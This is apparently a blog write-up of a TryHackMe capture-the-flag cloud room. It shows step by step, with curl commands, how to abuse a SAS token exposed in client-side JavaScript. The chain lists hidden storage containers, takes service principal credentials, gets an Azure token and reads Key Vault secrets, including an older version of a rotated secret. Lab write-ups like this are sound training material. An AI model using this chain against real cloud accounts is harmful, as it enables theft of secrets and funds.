# TRYHACKME — CRYPTOCABANA

This room is a part of THM’s HackerHolidays 2026.

---

### TRYHACKME — CRYPTOCABANA

![](https://cdn-images-1.medium.com/max/800/1*CaHcgyS_9zynZFxMY8TSlQ.png)

This room is a part of THM’s HackerHolidays 2026.

So the briefing basically tells us some guy backed up his wallet seed phrase at a kiosk called CryptoCabana, and by the time he got back from breakfast his wallet had already been drained. The kiosk’s landing page promised “Backed up. Sleep easy.” — classic famous last words.

Our job is to figure out what the kiosk trusts, follow that trust somewhere the page never points us, and find a second set of keys sitting behind a vault that doesn’t give up the real values on the first ask.

Let’s go.

First stop, the site’s `app.js`. Found this sitting right there:

```
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";  
const BACKUPS_CONTAINER = "backups";  
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```

A SAS token, sitting in client-side JS, scoped with `srt=sco` and `sp=rl`. Translation: this thing can read AND list at the service level, not just the one container the page uses. That's way more than it needs for uploading backups.

So instead of only looking at `backups`, let's list every container in the account:

```
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" | xmllint --format -
```

![](https://cdn-images-1.medium.com/max/800/1*qUaTwaUxFcU2eKD-IGwWxQ.png)

Three containers came back: `$web`, `backups`, and `vault`. The site never links to `vault` anywhere — that's exactly the "somewhere the page never points you" from the briefing.

Let’s see what’s inside it:

```
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" | xmllint --format -
```

![](https://cdn-images-1.medium.com/max/800/1*Ckrwet0O7xALf-bgc9iWrQ.png)

Two blobs in there: `seed_phrase.txt` and `backup-service-account.json`. The second one sounded way more interesting, so:

```
curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
```

And boom — full Azure service principal creds (client ID, client secret, tenant ID) plus a Key Vault name and URI. That’s the second set of keys the briefing was talking about.

Tried the normal way in first:

```
az login --service-principal \  
  -u <CLIENT_ID> \  
  -p '<CLIENT_SECRET>' \  
  --tenant <TENANT_ID>
```

![](https://cdn-images-1.medium.com/max/800/1*NEh_haZPWCWfEJ9VlAPeqg.png)

This just hung — the service principal has no subscription role, so `az login` gets stuck trying to enumerate subscriptions. Skipped it entirely and grabbed a token straight from the identity endpoint instead:

```
TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token" \  
  -d "client_id=<CLIENT_ID>" \  
  -d "client_secret=<CLIENT_SECRET>" \  
  -d "grant_type=client_credentials" \  
  -d "scope=https://vault.azure.net/.default" | jq -r .access_token)
```

```
echo $TOKEN
```

![](https://cdn-images-1.medium.com/max/800/1*lwEZTkCqld4W2oSX_jXgEw.png)

Got a token back, so let’s list what’s in the vault:

```
curl -s -H "Authorization: Bearer $TOKEN" \  
  "https://ccabana-kv-f5scjagc.vault.azure.net/secrets?api-version=7.4" | jq .
```

![](https://cdn-images-1.medium.com/max/800/1*MIHNYZSB2J6y5QYh9LVK3A.png)

Four secrets showed up: `key-shard-1`, `key-shard-2`, `key-shard-3`, and `master-key`. Pulled the three shards first:

```
for s in key-shard-1 key-shard-2 key-shard-3; do  
  echo "== $s =="  
  curl -s -H "Authorization: Bearer $TOKEN" \  
    "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/$s?api-version=7.4" | jq .  
done
```

![](https://cdn-images-1.medium.com/max/800/1*wAstB9qtaf-YXxvTbhsniw.png)

shard-1 and shard-3 gave clean flag fragments, but shard-2 just had a note saying it got rotated after IT flagged it, and that the old value “should still be recoverable if you know where to look.” Classic @0xMia hint from the briefing — if a value looks freshly rotated, ask what it looked like five minutes before.

So let’s check its version history instead of just the current value:

```
curl -s -H "Authorization: Bearer $TOKEN" \  
  "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/versions?api-version=7.4" | jq .
```

Two versions, a couple seconds apart. Grabbed the older one:

```
curl -s -H "Authorization: Bearer $TOKEN" \  
  "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/<OLDER_VERSION_ID>?api-version=7.4" | jq .
```

![](https://cdn-images-1.medium.com/max/800/1*LzGUihIFbcmHwtjvMuwE0Q.png)

That gave the real middle chunk, and stitching all three shards together got the flag.

Press enter or click to view image in full size

`THM{REDACTED}`

Fitting flag honestly, whole room is basically a live demo of “not your keys, not your coins” — an oversharing SAS token led to an unlisted container, which led to a service principal, which led into Key Vault, which still had the pre-rotation secret sitting in its version history.

Thanks for reading.

P.S. — I had to take some help from claude as i don’t know much about cloud (aws/azure).

By [Lightningfst](https://medium.com/@lightningfst8) on [August 4, 2026](https://medium.com/p/8ba4ab50f46b).

[Canonical link](https://medium.com/@lightningfst8/tryhackme-cryptocabana-8ba4ab50f46b)

Exported from [Medium](https://medium.com) on August 8, 2026.
